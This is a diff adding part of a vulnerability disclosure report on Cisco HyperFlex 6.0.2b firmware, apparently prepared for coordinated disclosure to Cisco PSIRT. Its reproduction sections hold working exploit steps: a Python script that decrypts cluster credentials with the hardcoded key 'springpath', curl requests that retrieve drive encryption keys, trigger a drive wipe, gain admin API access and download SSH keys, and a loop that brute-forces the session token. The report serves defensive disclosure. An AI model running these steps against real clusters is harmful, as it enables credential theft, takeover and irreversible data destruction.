+\item Disable \texttt{PermitRootLogin} on stCtlVM nodes.
+\item Consider eliminating ZooKeeper as a credential sync bus; use a dedicated
+  secrets manager with per-node delivery instead.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-916: Use of Password Hash with Insufficient Computational Effort ---
+  \url{https://cwe.mitre.org/data/definitions/916.html}
+\item NIST SP 800-63B, Section 5.1.1.2: Password hashing requirements
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F006: Hardcoded Key \texttt{'springpath'} in \texttt{EsxAuthZKMgmtImpl} Decrypts ESXi, vCenter, and UCSM Credentials from ZooKeeper}
+% =============================================================
+
+\findingmeta{CWE-321 (Use of Hard-coded Cryptographic Key)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Bytecode: \texttt{javap -verbose EsxAuthZKMgmtImpl.class} confirmed constant pool \#496/\#497 'springpath'}
+
+\subsection*{Plain Language Summary}
+
+HyperFlex encrypts and stores the passwords for ESXi, vCenter, and Cisco UCS
+Manager in ZooKeeper. The encryption password used for all of these credentials
+is the word ``springpath'' --- hardcoded in the software. This value is confirmed
+in the 6.0.2b bytecode at a specific location. The stored credentials are
+readable from ZooKeeper without authentication. With that single word, a
+ten-line script can decrypt the ESXi password for every hypervisor in the
+cluster, the vCenter password for the entire datacenter, and the UCS Manager
+password for the physical hardware layer.
+
+\subsection*{Vulnerability Description}
+
+ZooKeeper node \texttt{/storvisor2/stCluster} holds a JSON payload with
+AES/ECB-encrypted credentials for ESXi, vCenter SSO, and Cisco UCS Manager.
+The encryption key is the literal string \texttt{'springpath'}, confirmed at
+constant pool entry \#496 in \texttt{EsxAuthZKMgmtImpl.class} (6.0.2b).
+\texttt{BasicEncryptionUtil} implements AES/ECB/PKCS5Padding with SHA-256 key
+derivation from the caller-supplied string, confirmed at bytecode offset 33 in
+\texttt{BasicEncryptionUtil.class}.
+
+The same \texttt{'springpath'} value appears as the TLS keystore password
+(\texttt{syslog.keyStorePass}) in \texttt{application.conf}, confirming it is a
+project-level constant that has not been rotated. The ZK ACL is
+\texttt{OPEN\_ACL\_UNSAFE} (\texttt{world:anyone:cdrwa}): unauthenticated read
+from port 2181 is sufficient to retrieve the ciphertext.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# javap -verbose EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, 6.0.2b):
+#496 = Utf8              springpath
+#497 = String            #496    // springpath
+# bytecode offset 0:  ldc_w #497  // String springpath
+# bytecode offset 83: invokevirtual EncryptionUtil$.decryptData
+# bytecode offset 98: invokevirtual EncryptionUtil$.decryptData
+
+# javap -verbose BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar, 6.0.2b):
+# offset 33: ldc #79  // String AES/ECB/PKCS5Padding
+
+# ZK path (ZKConstants$.class, common-1.0.jar):
+# BASE_PATH = "/storvisor2"  SERVICE_NAME_MGR = "stCluster"
+# -> /storvisor2/stCluster
+
+# Decrypt any field from the ZK payload:
+import hashlib, base64
+from Crypto.Cipher import AES
+
+def hxdp_decrypt(b64_ct, key='springpath'):
+    k = hashlib.sha256(key.encode()).digest()
+    c = base64.b64decode(b64_ct)
+    return AES.new(k, AES.MODE_ECB).decrypt(c)
+
+# Read payload from ZK (no auth) and decrypt:
+from kazoo.client import KazooClient; import json
+zk = KazooClient('<ctlvm>:2181'); zk.start()
+payload = json.loads(zk.get('/storvisor2/stCluster')[0])
+print(hxdp_decrypt(payload['esx_password']))          # ESXi password
+print(hxdp_decrypt(payload['url_vcenter_encrypted_password']))  # vCenter
+print(hxdp_decrypt(payload['ucsm_pwd']))              # UCSM
+zk.stop()
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{enumerate}
+\item Read \texttt{/storvisor2/stCluster} from ZooKeeper port 2181 without
+  credentials.
+\item Run \texttt{hxdp\_decrypt(value, 'springpath')} on each encrypted field.
+\item Decrypted output includes ESXi password, vCenter password, and UCSM
+  password.
+\end{enumerate}
+
+\subsection*{Impact}
+
+ESXi admin access on all cluster hypervisors; vCenter admin on the entire
+datacenter; UCSM admin controlling physical blades, BMC, and fabric interconnect.
+All three credential classes are recoverable from a single unauthenticated
+ZooKeeper read.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Replace the hardcoded \texttt{'springpath'} AES key with a per-deployment
+  generated key in a hardware-backed keystore or TPM.
+\item Apply restrictive ZK ACLs on \texttt{/storvisor2/*}.
+\item Move credential storage out of ZooKeeper into a dedicated secrets manager.
+\item Enable ZooKeeper TLS and mutual authentication (ZK 3.5+).
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-321: Use of Hard-coded Cryptographic Key ---
+  \url{https://cwe.mitre.org/data/definitions/321.html}
+\item NIST SP 800-57 Part 1 Rev 5, Section 5.3: Key establishment requirements
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F007: Static AES Key Derived from Shipped Firmware File Decrypts All Runtime Cluster Credentials}
+% =============================================================
+
+\findingmeta{CWE-321 (Use of Hard-coded Cryptographic Key)}{Network (key derivation requires only the public firmware download)}{High}{High}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Key derivation confirmed: \texttt{md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5}; mechanism confirmed in \texttt{springpath\_env\_parse.py}}
+
+\subsection*{Plain Language Summary}
+
+HyperFlex encrypts the storage controller root password, SSL keystore password,
+and installer password using a key that is derived from a file shipped inside the
+firmware package. That file is publicly available in the firmware download. Its
+MD5 hash is the encryption key. The key is identical on every single HyperFlex
+6.0.2b installation. Anyone who has ever downloaded the firmware knows the
+encryption key for all deployed clusters and can decrypt any runtime credential
+file they obtain.
+
+\subsection*{Vulnerability Description}
+
+\texttt{springpath\_env\_parse.py} derives the AES-CBC key as
+\texttt{md5sum(Secret.class)} in hex-string form. \texttt{Secret.class}
+ships in the \texttt{storfs-misc} firmware package at the fixed path
+\texttt{/usr/share/hyperflex/storfs-misc/Secret.class}.
+
+\texttt{Secret.class} is a compiled Java class containing a single static long
+field (\texttt{secreteKey = 4346757647632874372L}) --- an obscurity measure that
+provides no cryptographic protection. The MD5 value of the 6.0.2b copy is
+deterministic and was confirmed by direct file hash:
+
+\medskip
+\begin{center}
+\texttt{md5sum Secret.class = 1f6d13bcd7753f2d3b2e2da361b7afb5}
+\end{center}
+\medskip
+
+This value is the AES-CBC key on every 6.0.2b installation. Runtime credentials
+(\texttt{stctl\_vm\_passwd}, \texttt{ssl\_cert\_passwd},
+\texttt{installer\_passwd}) are stored in deployment-generated
+\texttt{*.tunes} files encrypted with this key. An attacker who obtains any
+runtime tunes file can decrypt it offline using the publicly-derivable key.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}[style=python]
+# springpath_env_parse.py (storfs-misc_6.0.2b-44423_amd64.deb), verbatim:
+
+def md5(fname):
+    hash_md5 = hashlib.md5()
+    with open(fname, 'rb') as f:
+        for chunk in iter(lambda: f.read(4096), b''):
+            hash_md5.update(chunk)
+    return hash_md5.hexdigest()
+
+def decrypt(key, enc):
+    enc    = base64.b64decode(enc)
+    iv     = enc[:16]
+    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)
+    return unpad(cipher.decrypt(enc[16:]))
+
+# Runtime usage:
+file_md5 = md5('/usr/share/hyperflex/storfs-misc/Secret.class')
+decoded  = decrypt(file_md5, tunes_value)
+
+# Key confirmed static across all 6.0.2b nodes:
+# md5sum Secret.class == '1f6d13bcd7753f2d3b2e2da361b7afb5'
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{enumerate}
+\item Extract \texttt{Secret.class} from \texttt{storfs-misc\_6.0.2b-44423\_amd64.deb}.
+\item Compute its MD5: \texttt{md5sum Secret.class} yields
+  \texttt{1f6d13bcd7753f2d3b2e2da361b7afb5}.
+\item Use this value as the AES-CBC key (hex-string encoded).
+\item Decrypt any value from a runtime \texttt{springpath\_custom\_node.tunes}
+  or \texttt{springpath\_custom\_cluster.tunes} file using the
+  \texttt{decrypt()} function above.
+\end{enumerate}
+
+\subsection*{Impact}
+
+All runtime cluster credentials encrypted by the tunes mechanism are decryptable
+using the publicly-derivable static key. The storage controller root password
+is within the \texttt{stctl\_vm\_passwd} field.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Generate the AES key per-installation at first boot using a CSRNG
+  (e.g., PBKDF2 with per-node salt stored in a TPM or kernel keyring).
+\item Remove \texttt{Secret.class} from the firmware distribution package ---
+  key material must not ship alongside the ciphertext it protects.
+\item Rotate all credentials in existing tunes files after patching.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-321: Use of Hard-coded Cryptographic Key ---
+  \url{https://cwe.mitre.org/data/definitions/321.html}
+\item NIST SP 800-57 Part 1 Rev 5: Key management requirements
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F008: Unauthenticated HTTP API on Port 8012 Exposes Drive Cryptographic Erasure and Node Key Encryption Key}
+% =============================================================
+
+\findingmeta{CWE-306 (Missing Authentication for Critical Function)}{Network}{High}{None}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{strings sedsvc} confirmed all endpoint strings and port 8012}
+
+\subsection*{Plain Language Summary}
+
+A service running on every HyperFlex node manages the self-encrypting drives.
+It listens on a network port bound to all interfaces and does not require a
+password for any operation. One endpoint --- available to any machine on the
+management network with no login --- sends a command to the drives to erase
+themselves cryptographically. Data erased this way cannot be recovered. Another
+endpoint returns the node's key encryption key over the network to any caller,
+enabling decryption of the drive contents.
+
+\subsection*{Vulnerability Description}
+
+\texttt{sedsvc} is a Go HTTP server managing TCG OPAL Self-Encrypting Drive
+(SED) operations. It binds to \texttt{0.0.0.0:8012}.
+\texttt{main.(*myHandler).ServeHTTP} performs a single URL-to-handler map
+lookup and calls the handler directly with no authentication step.
+
+Confirmed endpoints from the 6.0.2b Go symbol table and string table:
+
+\begin{itemize}[noitemsep]
+\item \texttt{POST /sec\_erase\_all} $\rightarrow$ \texttt{BMC\_SecureEraseAll}
+  $\rightarrow$ \texttt{SEDUTIL\_SecureEraseAll} at \texttt{0x674940} ---
+  cryptographic erase of all SED drives; data is irrecoverable
+\item \texttt{POST /sec\_erase} $\rightarrow$ erase a specific drive by serial number
+\item \texttt{GET /get\_config} $\rightarrow$ returns BMC config including the node
+  Key Encryption Key (KEK) as a base64-encoded string
+\item \texttt{GET /get\_inventory} $\rightarrow$ per-drive encryption state, serial
+  numbers, firmware versions, lock status
+\end{itemize}
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# strings sedsvc (storfs-appliance_6.0.2b-44423_amd64.deb):
+:8012          # bind address -- all interfaces
+sec_erase      # endpoint
+sec_erase_all  # endpoint
+/get_config    # endpoint
+/get_inventory # endpoint
+/disk_status   # endpoint
+
+# ServeHTTP dispatch (Go symbol table):
+0x666b60: call mapaccess2_faststr(mux, url_path)
+0x666b65: test bl, bl    ; found?
+0x666b67: je   not_found ; only check: does route exist?
+0x666b80: call *rsi      ; call handler -- NO auth gate
+0x674940: BMC_SecureEraseAll
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=shell]
+# Retrieve node KEK without credentials:
+curl -s http://<ctlvm_ip>:8012/get_config
+# -> Response JSON contains nodeKek: "<base64_kek>"
+
+# Cryptographic erase all drives without credentials (CONTROLLED ENV ONLY):
+curl -s -X POST http://<ctlvm_ip>:8012/sec_erase_all \
+  -H 'Content-Type: application/json' -d '{}'
+# -> All SED drives on the node are cryptographically erased; data unrecoverable
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Any machine on the management network can cryptographically erase all data on
+a cluster node with a single unauthenticated POST request. The same service
+exposes the node KEK, enabling offline decryption of drive contents.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Bind \texttt{sedsvc} to \texttt{127.0.0.1} only, or replace the TCP
+  listener with a Unix domain socket.
+\item Add authentication (shared secret or bearer token) validated before
+  any handler is dispatched.
+\item Gate \texttt{/sec\_erase} and \texttt{/sec\_erase\_all} behind an
+  additional short-TTL confirmation token to prevent single-packet erasure.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-306: Missing Authentication for Critical Function ---
+  \url{https://cwe.mitre.org/data/definitions/306.html}
+\item TCG Opal Storage Specification 2.0: section on key management
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F009: nginx Port 8997 Binds to All Interfaces and Auto-Injects Admin Session --- No Credentials Required}
+% =============================================================
+
+\findingmeta{CWE-284 (Improper Access Control)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{rest\_internal.conf} confirmed \texttt{listen *:8997 ssl} and \texttt{proxy\_set\_header X-RootSessionID}}
+
+\subsection*{Plain Language Summary}
+
+nginx on HyperFlex listens on port 8997 bound to every network interface and
+automatically attaches the administrator session credential to every request it
+receives before forwarding that request to the management API. Port 8997 is
+not restricted to loopback. Any machine that can reach this port gets full
+administrator access to the entire HyperFlex REST API without providing any
+login credentials. This is confirmed by the \texttt{stCli} command-line tool,
+which uses this port to administer the cluster from remote hosts.
+
+\subsection*{Vulnerability Description}
+
+\texttt{rest\_internal.conf} (from \texttt{storfs-misc}) configures nginx to
+listen on port 8997 with \texttt{listen *:PORT ssl} (binding to all network
+interfaces) and injects \texttt{proxy\_set\_header X-RootSessionID SESSIONID}
+for every proxied request before forwarding to the management API backend at
+\texttt{localhost:8000}. The \texttt{proxy\_set\_header} directive overwrites
+any client-supplied value, so the attacker's request arrives at the backend
+carrying a valid admin session credential automatically provided by nginx.
+
+The \texttt{stCli.sh} script confirms that port 8997 is used for remote
+cluster administration: \texttt{springpath\_host=clusterIp; springpath\_port=8997}.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# rest_internal.conf (storfs-misc_6.0.2b-44423_amd64.deb):
+listen *:PORT ssl;                              # line 4 -- all interfaces
+proxy_set_header X-RootSessionID SESSIONID;    # line 42
+proxy_set_header X-RootSessionID SESSIONID;    # line 72 (stMgr block)
+
+# restintport.cfg:
+PORT=8997
+
+# stCli.sh:12 -- remote usage confirmed:
+export springpath_host=${clusterIp}
+export springpath_port=8997
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=shell]
+# No credentials. Request goes via port 8997 -> nginx injects admin session:
+curl -sk https://<ctlvm_ip>:8997/coreapi/v1/clusters
+# -> HTTP 200 with full cluster configuration (admin-level response)
+
+curl -sk https://<ctlvm_ip>:8997/rest/v1/nodes
+# -> HTTP 200 with all node IPs, serial numbers, and roles
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Any machine reachable on port 8997 gets full admin access to the complete
+HyperFlex REST API (\texttt{/rest}, \texttt{/coreapi}, \texttt{/encryption},
+\texttt{/dataprotection}, \texttt{/backupservice}, \texttt{/stMgr}, and others).
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Change \texttt{listen *:PORT ssl} to \texttt{listen 127.0.0.1:PORT ssl}
+  to restrict port 8997 to loopback only.
+\item The \texttt{stCli} tool should authenticate against port 443 with
+  explicit credentials instead of the privileged proxy port.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-284: Improper Access Control ---
+  \url{https://cwe.mitre.org/data/definitions/284.html}
+\item OWASP Top 10 A01:2021 --- Broken Access Control
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F010: Unauthenticated Access to \texttt{/tmp/} via nginx \texttt{/sbdl/} Path Alias}
+% =============================================================
+
+\findingmeta{CWE-284 (Improper Access Control)}{Network}{High}{None}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{nginx.conf} confirmed \texttt{location /sbdl/ \{ alias /tmp/; auth\_basic off; \}}}
+
+\subsection*{Plain Language Summary}
+
+The nginx configuration maps the URL \texttt{/sbdl/} directly to the
+\texttt{/tmp/} directory on disk and turns off the authentication requirement
+for that path. During normal cluster operations --- upgrades and node
+replacements --- HyperFlex writes SSH private keys for all storage controllers
+and plaintext ESXi passwords into \texttt{/tmp/}. Anyone who can reach the
+stCtlVM over the network can download those files by guessing or brute-forcing
+the filename, without ever logging in.
+
+\subsection*{Vulnerability Description}
+
+\texttt{nginx.conf} contains: \texttt{location /sbdl/ \{ alias /tmp/;
+auth\_basic off; \}}. This exposes the entire \texttt{/tmp/} tree as a
+directory served without authentication. During upgrade and node replacement
+workflows, the following files are written to \texttt{/tmp/}:
+
+\begin{itemize}[noitemsep]
+\item \texttt{/tmp/sshKeyPair*.json} --- SSH private keys for all stCtlVM nodes
+  (written by \texttt{generateSshKeys.py}, consumed by upgrade hooks)
+\item \texttt{/tmp/upgradeHooksCreds*.json} --- plaintext ESXi username and
+  password (used by all upgrade hook scripts)
+\item \texttt{/tmp/nodeInventory*.json} --- cluster node topology
+\item \texttt{/tmp/clusterConfig*.json} --- cluster configuration data
+\end{itemize}
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# nginx.conf (storfs-misc_6.0.2b-44423_amd64.deb):
+location /sbdl/ {
+    alias /tmp/;
+    auth_basic off;
+}
+
+# generateSshKeys.py:46 -- SSH keys written to /tmp:
+sshKeysFileHandle, sshKeysFile = mkstemp(
+    suffix='.json', prefix='sshKeyPair', dir='/tmp')
+
+# commonFunctions.py:645 -- consumers read from /tmp:
+credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')
+
+# Upgrade hook:
+JSON_CREDS_FILE_MATCH = '/tmp/upgradeHooksCreds*.json'
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=shell]
+# During a cluster upgrade or node replacement, poll for credential files:
+# SSH private keys:
+curl -sk "http://<ctlvm_ip>/sbdl/sshKeyPair<random>.json"
+# -> Returns JSON with SSH private key for all nodes
+
+# ESXi credentials:
+curl -sk "http://<ctlvm_ip>/sbdl/upgradeHooksCreds<random>.json"
+# -> Returns JSON with ESXi plaintext username and password
+\end{lstlisting}
+
+\subsection*{Impact}
+
+SSH private keys for all storage controllers and ESXi plaintext credentials are
+downloadable without authentication during cluster maintenance windows.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Replace the \texttt{/tmp/} alias with a specific pattern matching only
+  support bundle archives (e.g.,
+  \texttt{location \textasciitilde{} \^{}/sbdl/supportBundle-[a-zA-Z0-9\textunderscore-]+\textbackslash.tar\textbackslash.gz\$}).
+\item Move SSH key files and credential files from \texttt{/tmp/} to a
+  directory not served by nginx.
+\item If \texttt{/tmp/} aliasing is required, restrict access to loopback:
+  \texttt{allow 127.0.0.1; deny all}.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-284: Improper Access Control ---
+  \url{https://cwe.mitre.org/data/definitions/284.html}
+\item CWE-538: File and Directory Information Exposure ---
+  \url{https://cwe.mitre.org/data/definitions/538.html}
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F011: Root Session Token Generated with 15-bit Entropy and Stored World-Readable}
+% =============================================================
+
+\findingmeta{CWE-330 (Use of Insufficiently Random Values)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{\texttt{set\_shared\_key.sh} confirmed \texttt{\$RANDOM} and \texttt{chmod 644}}
+
+\subsection*{Plain Language Summary}
+
+HyperFlex generates an internal session token that grants full administrator
+access to the management API. The token is created by appending a random number
+between 0 and 32,767 to the VM's UUID. The UUID is readable from standard BIOS
+interrogation tools. The token is then saved to a file readable by every user on
+the system. An attacker who has the UUID can try all 32,768 possible tokens in
+under a second to find the valid one. Any local user can read the file directly
+without trying.
+
+\subsection*{Vulnerability Description}
+
+\texttt{set\_shared\_key.sh} generates the \texttt{X-RootSessionID} token
+used by \texttt{stSSOMgr} and all internal API callers with
+\texttt{useRootSessionId=True}:
+
+\begin{center}
+\texttt{sharedkey=\$nodeid-\$RANDOM}
+\end{center}
+
+Bash \texttt{\$RANDOM} produces integers in $[0,\,32767]$ --- exactly 15 bits,
+32,768 possible values. \texttt{nodeid} is the VMware VM UUID from
+\texttt{/opt/hyperflex/etc/product\_uuid}, which is discoverable via
+\texttt{dmidecode -s system-uuid} (any local user) or via the vCenter/ESXi
+management API. The file is then written world-readable:
+\texttt{chmod 644 root\_file.pub}.
+
+The token bypasses JWT authentication for certificate management
+(\texttt{nginxCertManager.py}), syslog synchronization
+(\texttt{synchronizeSyslog.py}), scheduled scripts (\texttt{schScripts.py}),
+inventory updates (\texttt{update-inventory.py}), and STIG settings
+(\texttt{5997\_stig\_setting\_ESX.py}).
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# set_shared_key.sh (storfs-misc_6.0.2b-44423_amd64.deb), verbatim:
+nodeid=$(cat /opt/hyperflex/etc/product_uuid)
+sharedkey=$nodeid-$RANDOM           # 15-bit entropy: [0, 32767]
+echo $sharedkey > $dest/root_file.pub
+chmod 644 $dest/root_file.pub       # world-readable
+
+# StTransportBase.py:26 -- consumer:
+X_ROOT_SESSION_ID = open('/etc/hyperflex/secure/root_file.pub').read().strip()
+
+# commonFunctions.py:42 -- header injection:
+headers['X-RootSessionID'] = rootSessionId
+
+# Keyspace: 2^15 = 32,768 values; guessable in < 1 second
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=shell]
+# From any local account -- read the token directly:
+cat /etc/hyperflex/secure/root_file.pub
+
+# From a remote position with the VM UUID -- brute-force in < 1 second:
+UUID=$(cat /opt/hyperflex/etc/product_uuid)   # or via dmidecode
+for N in $(seq 0 32767); do
+    TOKEN="${UUID}-${N}"
+    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
+        -H "X-RootSessionID: ${TOKEN}" \
+        http://localhost:8000/rest/v1/cluster)
+    [ "$STATUS" = "200" ] && echo "Valid token: $TOKEN" && break
+done
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Attacker obtains a valid \texttt{X-RootSessionID} token that grants
+administrator-equivalent access to the internal HyperFlex management API,
+bypassing JWT authentication. From any local account, the token is directly
+readable from the filesystem.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Replace \texttt{\$RANDOM} with a CSRNG:
+  \texttt{sharedkey=\$(openssl rand -hex 32)}.
+\item Change the file permissions to \texttt{600} (owner-only):
+  \texttt{chmod 600 root\_file.pub}.
+\item Consider replacing the file-based \texttt{X-RootSessionID} scheme with
+  a time-limited token issued by the AAA service.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-330: Use of Insufficiently Random Values ---
+  \url{https://cwe.mitre.org/data/definitions/330.html}
+\item CWE-732: Incorrect Permission Assignment for Critical Resource ---
+  \url{https://cwe.mitre.org/data/definitions/732.html}
+\item NIST SP 800-90A Rev 1: Recommendation for Random Number Generation
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section*{Proof of Concept}
+% =============================================================
+
+Code demonstrating each finding is available for coordinated review by Cisco
+PSIRT. None of the above findings were exercised against live production systems.
+All evidence is derived from static analysis of the 6.0.2b firmware package.
+
+Available immediately upon Cisco PSIRT request:
+
+\begin{itemize}[noitemsep]
+\item \textbf{HX-F001/F002:} Python Thrift client calling
+  \texttt{getDataEncryptionKeys} and \texttt{formatDisks} with zero
+  credentials
+\item \textbf{HX-F003:} \texttt{curl} command demonstrating unauthenticated
+  \texttt{/st-support/*} access with credential observation via netcat listener
+\item \textbf{HX-F004:} Python \texttt{kazoo} script writing attacker
+  certificate to ZooKeeper and observing nginx restart
+\item \textbf{HX-F005:} \texttt{zkCli.sh} read of \texttt{/user\_credentials}
+  plus hashcat crack invocation
+\item \textbf{HX-F006:} Python decrypt script --- \texttt{hxdp\_decrypt(b64,
+  'springpath')} applied to ZK payload
+\item \textbf{HX-F007:} Key derivation script plus AES-CBC decrypt skeleton
+\item \textbf{HX-F008:} \texttt{curl} commands for \texttt{/get\_config} and
+  \texttt{/sec\_erase\_all}
+\item \textbf{HX-F009:} \texttt{curl} commands demonstrating full admin API
+  access via port 8997
+\item \textbf{HX-F010:} \texttt{curl} demonstrating SSH key and credential
+  file download from \texttt{/sbdl/}
+\item \textbf{HX-F011:} Shell brute-force script plus direct file read
+\end{itemize}
+
+% =============================================================
+\section*{Disclosure Timeline}
+% =============================================================
+
+\begin{tabular}{@{}L{3.5cm}L{10.5cm}@{}}
+\toprule
+\textbf{Date} & \textbf{Event} \\
+\midrule
+2026-09-08 & Static firmware analysis completed; all 11 findings confirmed \\
+2026-09-08 & PSIRT submission \\
+2026-12-07 & Proposed public disclosure date (90 days) \\
+\bottomrule
+\end{tabular}
+
+\medskip
+\noindent
+Willing to extend the timeline with documented progress toward a patch.
+Requesting acknowledgment within 10 business days per Cisco PSIRT policy.
+
+% =============================================================
+\section*{Contact}
+% =============================================================
+
+\noindent
+Submitted via Cisco PSIRT online portal:
+\url{https://tools.cisco.com/security/center/resources/security_vulnerability_policy.html}
+
+\bigskip
+\noindent\rule{\linewidth}{0.4pt}
+{\small\textit{All analysis performed on publicly distributed firmware.
+No production systems were accessed.}}
+
+\end{document}
